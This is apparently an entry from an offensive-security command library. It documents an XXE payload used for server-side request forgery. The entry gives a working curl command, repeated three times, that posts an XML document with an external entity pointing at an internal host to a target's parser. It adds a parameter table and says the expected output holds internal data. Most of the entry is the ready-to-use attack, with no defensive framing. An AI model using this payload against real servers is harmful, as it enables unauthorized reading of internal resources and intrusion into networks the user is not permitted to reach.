---
data: >-
  curl -X POST "http://target.com/xmlparse.php" -H "Content-Type:
  application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "http://internal.hidden/page">]><foo>&xxe;</foo>'
tags:
  - xxe
  - ssrf
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 03f7bf01-36af-4e32-81a7-103e5027247c
created_at: '2025-12-13T09:00:27.434Z'
updated_at: '2025-12-13T09:00:27.434Z'
verified: false
validated: true
submitted: true
---
# XXE SSRF Payload

## Command

```bash
curl -X POST "http://target.com/xmlparse.php" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.hidden/page">]><foo>&xxe;</foo>'
```

## Description

This command injects an XXE payload to perform SSRF, requesting internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/xml"` | Set XML content type | Yes |
| `-d 'xml-payload'` | XXE payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://target.com/xmlparse.php" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.hidden/page">]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST "http://target.com/xmlparse.php" -H "Content-Type: application/xml" -d 'custom-xxe-payload'
```

## Expected Output

Response containing data from the internal resource.

## Related

- [[procedures/Exploit-XXE-for-SSRF-to-Access-Hidden-Pages]]
- [[tools/Curl]]
